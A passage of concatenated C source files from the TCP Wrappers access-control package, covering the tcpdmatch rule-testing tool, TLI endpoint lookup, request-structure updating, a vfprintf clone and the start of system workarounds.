static int reserved_name(pat)
char   *pat;
{
    return (STR_EQ(pat, unknown)
	    || STR_EQ(pat, "KNOWN")
	    || STR_EQ(pat, paranoid)
	    || STR_EQ(pat, "ALL")
	    || STR_EQ(pat, "LOCAL"));
}
 /*
  * tcpdmatch - explain what tcpd would do in a specific case
  * 
  * usage: tcpdmatch [-d] [-i inet_conf] daemon[@host] [user@]host
  * 
  * -d: use the access control tables in the current directory.
  * 
  * -i: location of inetd.conf file.
  * 
  * All errors are reported to the standard error stream, including the errors
  * that would normally be reported via the syslog daemon.
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) tcpdmatch.c 1.5 96/02/11 17:01:36";
#endif

/* System libraries. */

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <syslog.h>
#include <setjmp.h>
#include <string.h>

extern void exit();
extern int optind;
extern char *optarg;

#ifndef	INADDR_NONE
#define	INADDR_NONE	(-1)		/* XXX should be 0xffffffff */
#endif

#ifndef S_ISDIR
#define S_ISDIR(m)	(((m) & S_IFMT) == S_IFDIR)
#endif

/* Application-specific. */

#include "tcpd.h"
#include "inetcf.h"
#include "scaffold.h"

static void usage();
static void tcpdmatch();

/* The main program */

int     main(argc, argv)
int     argc;
char  **argv;
{
    struct hostent *hp;
    char   *myname = argv[0];
    char   *client;
    char   *server;
    char   *addr;
    char   *user;
    char   *daemon;
    struct request_info request;
    int     ch;
    char   *inetcf = 0;
    int     count;
    struct sockaddr_in server_sin;
    struct sockaddr_in client_sin;
    struct stat st;

    /*
     * Show what rule actually matched.
     */
    hosts_access_verbose = 2;

    /*
     * Parse the JCL.
     */
    while ((ch = getopt(argc, argv, "di:")) != EOF) {
	switch (ch) {
	case 'd':
	    hosts_allow_table = "hosts.allow";
	    hosts_deny_table = "hosts.deny";
	    break;
	case 'i':
	    inetcf = optarg;
	    break;
	default:
	    usage(myname);
	    /* NOTREACHED */
	}
    }
    if (argc != optind + 2)
	usage(myname);

    /*
     * When confusion really strikes...
     */
    if (check_path(REAL_DAEMON_DIR, &st) < 0) {
	tcpd_warn("REAL_DAEMON_DIR %s: %m", REAL_DAEMON_DIR);
    } else if (!S_ISDIR(st.st_mode)) {
	tcpd_warn("REAL_DAEMON_DIR %s is not a directory", REAL_DAEMON_DIR);
    }

    /*
     * Default is to specify a daemon process name. When daemon@host is
     * specified, separate the two parts.
     */
    if ((server = split_at(argv[optind], '@')) == 0)
	server = unknown;
    if (argv[optind][0] == '/') {
	daemon = strrchr(argv[optind], '/') + 1;
	tcpd_warn("%s: daemon name normalized to: %s", argv[optind], daemon);
    } else {
	daemon = argv[optind];
    }

    /*
     * Default is to specify a client hostname or address. When user@host is
     * specified, separate the two parts.
     */
    if ((client = split_at(argv[optind + 1], '@')) != 0) {
	user = argv[optind + 1];
    } else {
	client = argv[optind + 1];
	user = unknown;
    }

    /*
     * Analyze the inetd (or tlid) configuration file, so that we can warn
     * the user about services that may not be wrapped, services that are not
     * configured, or services that are wrapped in an incorrect manner. Allow
     * for services that are not run from inetd, or that have tcpd access
     * control built into them.
     */
    inetcf = inet_cfg(inetcf);
    inet_set("portmap", WR_NOT);
    inet_set("rpcbind", WR_NOT);
    switch (inet_get(daemon)) {
    case WR_UNKNOWN:
	tcpd_warn("%s: no such process name in %s", daemon, inetcf);
	break;
    case WR_NOT:
	tcpd_warn("%s: service possibly not wrapped", daemon);
	break;
    }

    /*
     * Check accessibility of access control files.
     */
    (void) check_path(hosts_allow_table, &st);
    (void) check_path(hosts_deny_table, &st);

    /*
     * Fill in what we have figured out sofar. Use socket and DNS routines
     * for address and name conversions. We attach stdout to the request so
     * that banner messages will become visible.
     */
    request_init(&request, RQ_DAEMON, daemon, RQ_USER, user, RQ_FILE, 1, 0);
    sock_methods(&request);

    /*
     * If a server hostname is specified, insist that the name maps to at
     * most one address. eval_hostname() warns the user about name server
     * problems, while using the request.server structure as a cache for host
     * address and name conversion results.
     */
    if (NOT_INADDR(server) == 0 || HOSTNAME_KNOWN(server)) {
	if ((hp = find_inet_addr(server)) == 0)
	    exit(1);
	memset((char *) &server_sin, 0, sizeof(server_sin));
	server_sin.sin_family = AF_INET;
	request_set(&request, RQ_SERVER_SIN, &server_sin, 0);

	for (count = 0; (addr = hp->h_addr_list[count]) != 0; count++) {
	    memcpy((char *) &server_sin.sin_addr, addr,
		   sizeof(server_sin.sin_addr));

	    /*
	     * Force evaluation of server host name and address. Host name
	     * conflicts will be reported while eval_hostname() does its job.
	     */
	    request_set(&request, RQ_SERVER_NAME, "", RQ_SERVER_ADDR, "", 0);
	    if (STR_EQ(eval_hostname(request.server), unknown))
		tcpd_warn("host address %s->name lookup failed",
			  eval_hostaddr(request.server));
	}
	if (count > 1) {
	    fprintf(stderr, "Error: %s has more than one address\n", server);
	    fprintf(stderr, "Please specify an address instead\n");
	    exit(1);
	}
	free((char *) hp);
    } else {
	request_set(&request, RQ_SERVER_NAME, server, 0);
    }

    /*
     * If a client address is specified, we simulate the effect of client
     * hostname lookup failure.
     */
    if (dot_quad_addr(client) != INADDR_NONE) {
	request_set(&request, RQ_CLIENT_ADDR, client, 0);
	tcpdmatch(&request);
	exit(0);
    }

    /*
     * Perhaps they are testing special client hostname patterns that aren't
     * really host names at all.
     */
    if (NOT_INADDR(client) && HOSTNAME_KNOWN(client) == 0) {
	request_set(&request, RQ_CLIENT_NAME, client, 0);
	tcpdmatch(&request);
	exit(0);
    }

    /*
     * Otherwise, assume that a client hostname is specified, and insist that
     * the address can be looked up. The reason for this requirement is that
     * in real life the client address is available (at least with IP). Let
     * eval_hostname() figure out if this host is properly registered, while
     * using the request.client structure as a cache for host name and
     * address conversion results.
     */
    if ((hp = find_inet_addr(client)) == 0)
	exit(1);
    memset((char *) &client_sin, 0, sizeof(client_sin));
    client_sin.sin_family = AF_INET;
    request_set(&request, RQ_CLIENT_SIN, &client_sin, 0);

    for (count = 0; (addr = hp->h_addr_list[count]) != 0; count++) {
	memcpy((char *) &client_sin.sin_addr, addr,
	       sizeof(client_sin.sin_addr));

	/*
	 * Force evaluation of client host name and address. Host name
	 * conflicts will be reported while eval_hostname() does its job.
	 */
	request_set(&request, RQ_CLIENT_NAME, "", RQ_CLIENT_ADDR, "", 0);
	if (STR_EQ(eval_hostname(request.client), unknown))
	    tcpd_warn("host address %s->name lookup failed",
		      eval_hostaddr(request.client));
	tcpdmatch(&request);
	if (hp->h_addr_list[count + 1])
	    printf("\n");
    }
    free((char *) hp);
    exit(0);
}

/* Explain how to use this program */

static void usage(myname)
char   *myname;
{
    fprintf(stderr, "usage: %s [-d] [-i inet_conf] daemon[@host] [user@]host\n",
	    myname);
    fprintf(stderr, "	-d: use allow/deny files in current directory\n");
    fprintf(stderr, "	-i: location of inetd.conf file\n");
    exit(1);
}

/* Print interesting expansions */

static void expand(text, pattern, request)
char   *text;
char   *pattern;
struct request_info *request;
{
    char    buf[BUFSIZ];

    if (STR_NE(percent_x(buf, sizeof(buf), pattern, request), unknown))
	printf("%s %s\n", text, buf);
}

/* Try out a (server,client) pair */

static void tcpdmatch(request)
struct request_info *request;
{
    int     verdict;

    /*
     * Show what we really know. Suppress uninteresting noise.
     */
    expand("client:   hostname", "%n", request);
    expand("client:   address ", "%a", request);
    expand("client:   username", "%u", request);
    expand("server:   hostname", "%N", request);
    expand("server:   address ", "%A", request);
    expand("server:   process ", "%d", request);

    /*
     * Reset stuff that might be changed by options handlers. In dry-run
     * mode, extension language routines that would not return should inform
     * us of their plan, by clearing the dry_run flag. This is a bit clumsy
     * but we must be able to verify hosts with more than one network
     * address.
     */
    rfc931_timeout = RFC931_TIMEOUT;
    allow_severity = SEVERITY;
    deny_severity = LOG_WARNING;
    dry_run = 1;

    /*
     * When paranoid mode is enabled, access is rejected no matter what the
     * access control rules say.
     */
#ifdef PARANOID
    if (STR_EQ(eval_hostname(request->client), paranoid)) {
	printf("access:   denied (PARANOID mode)\n\n");
	return;
    }
#endif

    /*
     * Report the access control verdict.
     */
    verdict = hosts_access(request);
    printf("access:   %s\n",
	   dry_run == 0 ? "delegated" :
	   verdict ? "granted" : "denied");
}
 /*
  * Warning - this relies heavily on the TLI implementation in PTX 2.X and will
  * probably not work under PTX 4.
  * 
  * Author: Tim Wright, Sequent Computer Systems Ltd., UK.
  * 
  * Modified slightly to conform to the new internal interfaces - Wietse
  */

#ifndef lint
static char sccsid[] = "@(#) tli-sequent.c 1.1 94/12/28 17:42:51";
#endif

#ifdef TLI_SEQUENT

/* System libraries. */

#include <sys/types.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <sys/tiuser.h>
#include <sys/stream.h>
#include <sys/stropts.h>
#include <sys/tihdr.h>
#include <sys/timod.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <syslog.h>
#include <errno.h>
#include <string.h>

extern int errno;
extern char *sys_errlist[];
extern int sys_nerr;
extern int t_errno;
extern char *t_errlist[];
extern int t_nerr;

/* Local stuff. */

#include "tcpd.h"
#include "tli-sequent.h"

/* Forward declarations. */

static char *tli_error();
static void tli_sink();

/* tli_host - determine endpoint info */

int     tli_host(request)
struct request_info *request;
{
    static struct sockaddr_in client;
    static struct sockaddr_in server;
    struct _ti_user *tli_state_ptr;
    union T_primitives *TSI_prim_ptr;
    struct strpeek peek;
    int     len;

    /*
     * Use DNS and socket routines for name and address conversions.
     */

    sock_methods(request);

    /*
     * Find out the client address using getpeerinaddr(). This call is the
     * TLI equivalent to getpeername() under Dynix/ptx.
     */

    len = sizeof(client);
    t_sync(request->fd);
    if (getpeerinaddr(request->fd, &client, len) < 0) {
	tcpd_warn("can't get client address: %s", tli_error());
	return;
    }
    request->client->sin = &client;

    /* Call TLI utility routine to get information on endpoint */
    if ((tli_state_ptr = _t_checkfd(request->fd)) == NULL)
	return;

    if (tli_state_ptr->ti_servtype == T_CLTS) {
	/* UDP - may need to get address the hard way */
	if (client.sin_addr.s_addr == 0) {
	    /* The UDP endpoint is not connected so we didn't get the */
	    /* remote address - get it the hard way ! */

	    /* Look at the control part of the top message on the stream */
	    /* we don't want to remove it from the stream so we use I_PEEK */
	    peek.ctlbuf.maxlen = tli_state_ptr->ti_ctlsize;
	    peek.ctlbuf.len = 0;
	    peek.ctlbuf.buf = tli_state_ptr->ti_ctlbuf;
	    /* Don't even look at the data */
	    peek.databuf.maxlen = -1;
	    peek.databuf.len = 0;
	    peek.databuf.buf = 0;
	    peek.flags = 0;

	    switch (ioctl(request->fd, I_PEEK, &peek)) {
	    case -1:
		tcpd_warn("can't peek at endpoint: %s", tli_error());
		return;
	    case 0:
		/* No control part - we're hosed */
		tcpd_warn("can't get UDP info: %s", tli_error());
		return;
	    default:
		/* FALL THROUGH */
		;
	    }
	    /* Can we even check the PRIM_type ? */
	    if (peek.ctlbuf.len < sizeof(long)) {
		tcpd_warn("UDP control info garbage");
		return;
	    }
	    TSI_prim_ptr = (union T_primitives *) peek.ctlbuf.buf;
	    if (TSI_prim_ptr->type != T_UNITDATA_IND) {
		tcpd_warn("wrong type for UDP control info");
		return;
	    }
	    /* Validate returned unitdata indication packet */
	    if ((peek.ctlbuf.len < sizeof(struct T_unitdata_ind)) ||
		((TSI_prim_ptr->unitdata_ind.OPT_length != 0) &&
		 (peek.ctlbuf.len <
		  TSI_prim_ptr->unitdata_ind.OPT_length +
		  TSI_prim_ptr->unitdata_ind.OPT_offset))) {
		tcpd_warn("UDP control info garbaged");
		return;
	    }
	    /* Extract the address */
	    memcpy(&client,
		   peek.ctlbuf.buf + TSI_prim_ptr->unitdata_ind.SRC_offset,
		   TSI_prim_ptr->unitdata_ind.SRC_length);
	}
	request->sink = tli_sink;
    }
    if (getmyinaddr(request->fd, &server, len) < 0)
	tcpd_warn("can't get local address: %s", tli_error());
    else
	request->server->sin = &server;
}

/* tli_error - convert tli error number to text */

static char *tli_error()
{
    static char buf[40];

    if (t_errno != TSYSERR) {
	if (t_errno < 0 || t_errno >= t_nerr) {
	    sprintf(buf, "Unknown TLI error %d", t_errno);
	    return (buf);
	} else {
	    return (t_errlist[t_errno]);
	}
    } else {
	if (errno < 0 || errno >= sys_nerr) {
	    sprintf(buf, "Unknown UNIX error %d", errno);
	    return (buf);
	} else {
	    return (sys_errlist[errno]);
	}
    }
}

/* tli_sink - absorb unreceived datagram */

static void tli_sink(fd)
int     fd;
{
    struct t_unitdata *unit;
    int     flags;

    /*
     * Something went wrong. Absorb the datagram to keep inetd from looping.
     * Allocate storage for address, control and data. If that fails, sleep
     * for a couple of seconds in an attempt to keep inetd from looping too
     * fast.
     */

    if ((unit = (struct t_unitdata *) t_alloc(fd, T_UNITDATA, T_ALL)) == 0) {
	tcpd_warn("t_alloc: %s", tli_error());
	sleep(5);
    } else {
	(void) t_rcvudata(fd, unit, &flags);
	t_free((void *) unit, T_UNITDATA);
    }
}

#endif /* TLI_SEQUENT */
#ifdef __STDC__
#define __P(X) X
#else
#define __P(X) ()
#endif

extern int t_sync __P((int));
extern char *t_alloc __P((int, int, int));
extern int t_free __P((char *, int));
extern int t_rcvudata __P((int, struct t_unitdata *, int *));
extern int getpeerinaddr __P((int, struct sockaddr_in *, int));
extern int getmyinaddr __P((int, struct sockaddr_in *, int));
extern struct _ti_user *_t_checkfd __P((int));
 /*
  * tli_host() determines the type of transport (connected, connectionless),
  * the transport address of a client host, and the transport address of a
  * server endpoint. In addition, it provides methods to map a transport
  * address to a printable host name or address. Socket address results are
  * in static memory; tli structures are allocated from the heap.
  * 
  * The result from the hostname lookup method is STRING_PARANOID when a host
  * pretends to have someone elses name, or when a host name is available but
  * could not be verified.
  * 
  * Diagnostics are reported through syslog(3).
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) tli.c 1.14 95/01/03 22:26:03";
#endif

#ifdef TLI

/* System libraries. */

#include <sys/types.h>
#include <sys/param.h>
#include <sys/stream.h>
#include <sys/stat.h>
#include <sys/mkdev.h>
#include <sys/tiuser.h>
#include <sys/timod.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <syslog.h>
#include <errno.h>
#include <netconfig.h>
#include <netdir.h>
#include <string.h>

extern char *nc_sperror();
extern int errno;
extern char *sys_errlist[];
extern int sys_nerr;
extern int t_errno;
extern char *t_errlist[];
extern int t_nerr;

/* Local stuff. */

#include "tcpd.h"

/* Forward declarations. */

static void tli_endpoints();
static struct netconfig *tli_transport();
static void tli_hostname();
static void tli_hostaddr();
static void tli_cleanup();
static char *tli_error();
static void tli_sink();

/* tli_host - look up endpoint addresses and install conversion methods */

void    tli_host(request)
struct request_info *request;
{
    static struct sockaddr_in client;
    static struct sockaddr_in server;

    /*
     * If we discover that we are using an IP transport, pretend we never
     * were here. Otherwise, use the transport-independent method and stick
     * to generic network addresses. XXX hard-coded protocol family name.
     */

    tli_endpoints(request);
    if ((request->config = tli_transport(request->fd)) != 0
	&& STR_EQ(request->config->nc_protofmly, "inet")) {
	if (request->client->unit != 0) {
	    client = *(struct sockaddr_in *) request->client->unit->addr.buf;
	    request->client->sin = &client;
	}
	if (request->server->unit != 0) {
	    server = *(struct sockaddr_in *) request->server->unit->addr.buf;
	    request->server->sin = &server;
	}
	tli_cleanup(request);
	sock_methods(request);
    } else {
	request->hostname = tli_hostname;
	request->hostaddr = tli_hostaddr;
	request->cleanup = tli_cleanup;
    }
}

/* tli_cleanup - cleanup some dynamically-allocated data structures */

static void tli_cleanup(request)
struct request_info *request;
{
    if (request->config != 0)
	freenetconfigent(request->config);
    if (request->client->unit != 0)
	t_free((char *) request->client->unit, T_UNITDATA);
    if (request->server->unit != 0)
	t_free((char *) request->server->unit, T_UNITDATA);
}

/* tli_endpoints - determine TLI client and server endpoint information */

static void tli_endpoints(request)
struct request_info *request;
{
    struct t_unitdata *server;
    struct t_unitdata *client;
    int     fd = request->fd;
    int     flags;

    /*
     * Determine the client endpoint address. With unconnected services, peek
     * at the sender address of the pending protocol data unit without
     * popping it off the receive queue. This trick works because only the
     * address member of the unitdata structure has been allocated.
     * 
     * Beware of successful returns with zero-length netbufs (for example,
     * Solaris 2.3 with ticlts transport). The netdir(3) routines can't
     * handle that. Assume connection-less transport when TI_GETPEERNAME
     * produces no usable result, even when t_rcvudata() is unable to figure
     * out the peer address. Better to hang than to loop.
     */

    if ((client = (struct t_unitdata *) t_alloc(fd, T_UNITDATA, T_ADDR)) == 0) {
	tcpd_warn("t_alloc: %s", tli_error());
	return;
    }
    if (ioctl(fd, TI_GETPEERNAME, &client->addr) < 0 || client->addr.len == 0) {
	request->sink = tli_sink;
	if (t_rcvudata(fd, client, &flags) < 0 || client->addr.len == 0) {
	    tcpd_warn("can't get client address: %s", tli_error());
	    t_free((void *) client, T_UNITDATA);
	    return;
	}
    }
    request->client->unit = client;

    /*
     * Look up the server endpoint address. This can be used for filtering on
     * server address or name, or to look up the client user.
     */

    if ((server = (struct t_unitdata *) t_alloc(fd, T_UNITDATA, T_ADDR)) == 0) {
	tcpd_warn("t_alloc: %s", tli_error());
	return;
    }
    if (ioctl(fd, TI_GETMYNAME, &server->addr) < 0) {
	tcpd_warn("TI_GETMYNAME: %m");
	t_free((void *) server, T_UNITDATA);
	return;
    }
    request->server->unit = server;
}

/* tli_transport - find out TLI transport type */

static struct netconfig *tli_transport(fd)
int     fd;
{
    struct stat from_client;
    struct stat from_config;
    void   *handlep;
    struct netconfig *config;

    /*
     * Assuming that the network device is a clone device, we must compare
     * the major device number of stdin to the minor device number of the
     * devices listed in the netconfig table.
     */

    if (fstat(fd, &from_client) != 0) {
	tcpd_warn("fstat(fd %d): %m", fd);
	return (0);
    }
    if ((handlep = setnetconfig()) == 0) {
	tcpd_warn("setnetconfig: %m");
	return (0);
    }
    while (config = getnetconfig(handlep)) {
	if (stat(config->nc_device, &from_config) == 0) {
	    if (minor(from_config.st_rdev) == major(from_client.st_rdev))
		break;
	}
    }
    if (config == 0) {
	tcpd_warn("unable to identify transport protocol");
	return (0);
    }

    /*
     * Something else may clobber our getnetconfig() result, so we'd better
     * acquire our private copy.
     */

    if ((config = getnetconfigent(config->nc_netid)) == 0) {
	tcpd_warn("getnetconfigent(%s): %s", config->nc_netid, nc_sperror());
	return (0);
    }
    return (config);
}

/* tli_hostaddr - map TLI transport address to printable address */

static void tli_hostaddr(host)
struct host_info *host;
{
    struct request_info *request = host->request;
    struct netconfig *config = request->config;
    struct t_unitdata *unit = host->unit;
    char   *uaddr;

    if (config != 0 && unit != 0
	&& (uaddr = taddr2uaddr(config, &unit->addr)) != 0) {
	STRN_CPY(host->addr, uaddr, sizeof(host->addr));
	free(uaddr);
    }
}

/* tli_hostname - map TLI transport address to hostname */

static void tli_hostname(host)
struct host_info *host;
{
    struct request_info *request = host->request;
    struct netconfig *config = request->config;
    struct t_unitdata *unit = host->unit;
    struct nd_hostservlist *servlist;

    if (config != 0 && unit != 0
	&& netdir_getbyaddr(config, &servlist, &unit->addr) == ND_OK) {

	struct nd_hostserv *service = servlist->h_hostservs;
	struct nd_addrlist *addr_list;
	int     found = 0;

	if (netdir_getbyname(config, service, &addr_list) != ND_OK) {

	    /*
	     * Unable to verify that the name matches the address. This may
	     * be a transient problem or a botched name server setup. We
	     * decide to play safe.
	     */

	    tcpd_warn("can't verify hostname: netdir_getbyname(%s) failed",
		      service->h_host);

	} else {

	    /*
	     * Look up the host address in the address list we just got. The
	     * comparison is done on the textual representation, because the
	     * transport address is an opaque structure that may have holes
	     * with uninitialized garbage. This approach obviously loses when
	     * the address does not have a textual representation.
	     */

	    char   *uaddr = eval_hostaddr(host);
	    char   *ua;
	    int     i;

	    for (i = 0; found == 0 && i < addr_list->n_cnt; i++) {
		if ((ua = taddr2uaddr(config, &(addr_list->n_addrs[i]))) != 0) {
		    found = !strcmp(ua, uaddr);
		    free(ua);
		}
	    }
	    netdir_free((void *) addr_list, ND_ADDRLIST);

	    /*
	     * When the host name does not map to the initial address, assume
	     * someone has compromised a name server. More likely someone
	     * botched it, but that could be dangerous, too.
	     */

	    if (found == 0)
		tcpd_warn("host name/address mismatch: %s != %s",
			  host->addr, service->h_host);
	}
	STRN_CPY(host->name, found ? service->h_host : paranoid,
		 sizeof(host->name));
	netdir_free((void *) servlist, ND_HOSTSERVLIST);
    }
}

/* tli_error - convert tli error number to text */

static char *tli_error()
{
    static char buf[40];

    if (t_errno != TSYSERR) {
	if (t_errno < 0 || t_errno >= t_nerr) {
	    sprintf(buf, "Unknown TLI error %d", t_errno);
	    return (buf);
	} else {
	    return (t_errlist[t_errno]);
	}
    } else {
	if (errno < 0 || errno >= sys_nerr) {
	    sprintf(buf, "Unknown UNIX error %d", errno);
	    return (buf);
	} else {
	    return (sys_errlist[errno]);
	}
    }
}

/* tli_sink - absorb unreceived datagram */

static void tli_sink(fd)
int     fd;
{
    struct t_unitdata *unit;
    int     flags;

    /*
     * Something went wrong. Absorb the datagram to keep inetd from looping.
     * Allocate storage for address, control and data. If that fails, sleep
     * for a couple of seconds in an attempt to keep inetd from looping too
     * fast.
     */

    if ((unit = (struct t_unitdata *) t_alloc(fd, T_UNITDATA, T_ALL)) == 0) {
	tcpd_warn("t_alloc: %s", tli_error());
	sleep(5);
    } else {
	(void) t_rcvudata(fd, unit, &flags);
	t_free((void *) unit, T_UNITDATA);
    }
}

#endif /* TLI */
 /*
  * This program can be called via a remote shell command to find out if the
  * hostname and address are properly recognized, if username lookup works,
  * and (SysV only) if the TLI on top of IP heuristics work.
  * 
  * Example: "rsh host /some/where/try-from".
  * 
  * Diagnostics are reported through syslog(3) and redirected to stderr.
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) try-from.c 1.2 94/12/28 17:42:55";
#endif

/* System libraries. */

#include <sys/types.h>
#include <stdio.h>
#include <syslog.h>
#include <string.h>

#ifdef TLI
#include <sys/tiuser.h>
#include <stropts.h>
#endif

#ifndef STDIN_FILENO
#define	STDIN_FILENO	0
#endif

/* Local stuff. */

#include "tcpd.h"

int     allow_severity = SEVERITY;	/* run-time adjustable */
int     deny_severity = LOG_WARNING;	/* ditto */

main(argc, argv)
int     argc;
char  **argv;
{
    struct request_info request;
    char    buf[BUFSIZ];
    char   *cp;

    /*
     * Simplify the process name, just like tcpd would.
     */
    if ((cp = strrchr(argv[0], '/')) != 0)
	argv[0] = cp + 1;

    /*
     * Turn on the "IP-underneath-TLI" detection heuristics.
     */
#ifdef TLI
    if (ioctl(0, I_FIND, "timod") == 0)
	ioctl(0, I_PUSH, "timod");
#endif /* TLI */

    /*
     * Look up the endpoint information.
     */
    request_init(&request, RQ_DAEMON, argv[0], RQ_FILE, STDIN_FILENO, 0);
    (void) fromhost(&request);

    /*
     * Show some results. Name and address information is looked up when we
     * ask for it.
     */

#define EXPAND(str) percent_x(buf, sizeof(buf), str, &request)

    puts(EXPAND("client address  (%%a): %a"));
    puts(EXPAND("client hostname (%%n): %n"));
    puts(EXPAND("client username (%%u): %u"));
    puts(EXPAND("client info     (%%c): %c"));
    puts(EXPAND("server address  (%%A): %A"));
    puts(EXPAND("server hostname (%%N): %N"));
    puts(EXPAND("server process  (%%d): %d"));
    puts(EXPAND("server info     (%%s): %s"));

    return (0);
}
 /*
  * Routines for controlled update/initialization of request structures.
  * 
  * request_init() initializes its argument. Pointers and string-valued members
  * are initialized to zero, to indicate that no lookup has been attempted.
  * 
  * request_set() adds information to an already initialized request structure.
  * 
  * Both functions take a variable-length name-value list.
  * 
  * Diagnostics are reported through syslog(3).
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) update.c 1.1 94/12/28 17:42:56";
#endif

/* System libraries */

#include <stdio.h>
#include <syslog.h>
#include <string.h>

/* Local stuff. */

#include "mystdarg.h"
#include "tcpd.h"

/* request_fill - request update engine */

static struct request_info *request_fill(request, ap)
struct request_info *request;
va_list ap;
{
    int     key;
    char   *ptr;

    while ((key = va_arg(ap, int)) > 0) {
	switch (key) {
	default:
	    tcpd_warn("request_fill: invalid key: %d", key);
	    return (request);
	case RQ_FILE:
	    request->fd = va_arg(ap, int);
	    continue;
	case RQ_CLIENT_SIN:
	    request->client->sin = va_arg(ap, struct sockaddr_in *);
	    continue;
	case RQ_SERVER_SIN:
	    request->server->sin = va_arg(ap, struct sockaddr_in *);
	    continue;

	    /*
	     * All other fields are strings with the same maximal length.
	     */

	case RQ_DAEMON:
	    ptr = request->daemon;
	    break;
	case RQ_USER:
	    ptr = request->user;
	    break;
	case RQ_CLIENT_NAME:
	    ptr = request->client->name;
	    break;
	case RQ_CLIENT_ADDR:
	    ptr = request->client->addr;
	    break;
	case RQ_SERVER_NAME:
	    ptr = request->server->name;
	    break;
	case RQ_SERVER_ADDR:
	    ptr = request->server->addr;
	    break;
	}
	STRN_CPY(ptr, va_arg(ap, char *), STRING_LENGTH);
    }
    return (request);
}

/* request_init - initialize request structure */

struct request_info *VARARGS(request_init, struct request_info *, request)
{
    static struct request_info default_info;
    struct request_info *r;
    va_list ap;

    /*
     * Initialize data members. We do not assign default function pointer
     * members, to avoid pulling in the whole socket module when it is not
     * really needed.
     */
    VASTART(ap, struct request_info *, request);
    *request = default_info;
    request->fd = -1;
    strcpy(request->daemon, unknown);
    sprintf(request->pid, "%d", getpid());
    request->client->request = request;
    request->server->request = request;
    r = request_fill(request, ap);
    VAEND(ap);
    return (r);
}

/* request_set - update request structure */

struct request_info *VARARGS(request_set, struct request_info *, request)
{
    struct request_info *r;
    va_list ap;

    VASTART(ap, struct request_info *, request);
    r = request_fill(request, ap);
    VAEND(ap);
    return (r);
}
 /*
  * vfprintf() and vprintf() clones. They will produce unexpected results
  * when excessive dynamic ("*") field widths are specified. To be used for
  * testing purposes only.
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
static char sccsid[] = "@(#) vfprintf.c 1.2 94/03/23 17:44:46";
#endif

#include <stdio.h>
#include <ctype.h>
#ifdef __STDC__
#include <stdarg.h>
#else
#include <varargs.h>
#endif

/* vfprintf - print variable-length argument list to stream */

int     vfprintf(fp, format, ap)
FILE   *fp;
char   *format;
va_list ap;
{
    char    fmt[BUFSIZ];		/* format specifier */
    register char *fmtp;
    register char *cp;
    int     count = 0;

    /*
     * Iterate over characters in the format string, picking up arguments
     * when format specifiers are found.
     */

    for (cp = format; *cp; cp++) {
	if (*cp != '%') {
	    putc(*cp, fp);			/* ordinary character */
	    count++;
	} else {

	    /*
	     * Format specifiers are handled one at a time, since we can only
	     * deal with arguments one at a time. Try to determine the end of
	     * the format specifier. We do not attempt to fully parse format
	     * strings, since we are ging to let fprintf() do the hard work.
	     * In regular expression notation, we recognize:
	     * 
	     * %-?0?([0-9]+|\*)?\.?([0-9]+|\*)?l?[a-z]
	     * 
	     * which includes some combinations that do not make sense.
	     */

	    fmtp = fmt;
	    *fmtp++ = *cp++;
	    if (*cp == '-')			/* left-adjusted field? */
		*fmtp++ = *cp++;
	    if (*cp == '0')			/* zero-padded field? */
		*fmtp++ = *cp++;
	    if (*cp == '*') {			/* dynamic field witdh */
		sprintf(fmtp, "%d", va_arg(ap, int));
		fmtp += strlen(fmtp);
		cp++;
	    } else {
		while (isdigit(*cp))		/* hard-coded field width */
		    *fmtp++ = *cp++;
	    }
	    if (*cp == '.')			/* width/precision separator */
		*fmtp++ = *cp++;
	    if (*cp == '*') {			/* dynamic precision */
		sprintf(fmtp, "%d", va_arg(ap, int));
		fmtp += strlen(fmtp);
		cp++;
	    } else {
		while (isdigit(*cp))		/* hard-coded precision */
		    *fmtp++ = *cp++;
	    }
	    if (*cp == 'l')			/* long whatever */
		*fmtp++ = *cp++;
	    if (*cp == 0)			/* premature end, punt */
		break;
	    *fmtp++ = *cp;			/* type (checked below) */
	    *fmtp = 0;

	    /* Execute the format string - let fprintf() do the hard work. */

	    switch (fmtp[-1]) {
	    case 's':				/* string-valued argument */
		count += fprintf(fp, fmt, va_arg(ap, char *));
		break;
	    case 'c':				/* integral-valued argument */
	    case 'd':
	    case 'u':
	    case 'o':
	    case 'x':
		if (fmtp[-2] == 'l')
		    count += fprintf(fp, fmt, va_arg(ap, long));
		else
		    count += fprintf(fp, fmt, va_arg(ap, int));
		break;
	    case 'e':				/* float-valued argument */
	    case 'f':
	    case 'g':
		count += fprintf(fp, fmt, va_arg(ap, double));
		break;
	    default:				/* anything else */
		putc(fmtp[-1], fp);
		count++;
		break;
	    }
	}
    }
    return (count);
}

/* vprintf - print variable-length argument list to stdout */

vprintf(format, ap)
char   *format;
va_list ap;
{
    return (vfprintf(stdout, format, ap));
}
 /*
  * Workarounds for known system software bugs. This module provides wrappers
  * around library functions and system calls that are known to have problems
  * on some systems. Most of these workarounds won't do any harm on regular
  * systems.
  * 
  * Author: Wietse Venema, Eindhoven University of Technology, The Netherlands.
  */

#ifndef lint
char    sccsid[] = "@(#) workarounds.c 1.6 96/03/19 16:22:25";
#endif

#include <sys/types.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <stdio.h>
#include <syslog.h>
#include <string.h>

extern int errno;

#include "tcpd.h"

 /*
  * Some AIX versions advertise a too small MAXHOSTNAMELEN value (32).
  * Result: long hostnames would be truncated, and connections would be
  * dropped because of host name verification failures. Adrian van Bloois
  * (A.vanBloois@info.nic.surfnet.nl) figured out what was the problem.
  */

#if (MAXHOSTNAMELEN < 64)
#undef MAXHOSTNAMELEN
#endif

/* In case not defined in <sys/param.h>. */

#ifndef MAXHOSTNAMELEN
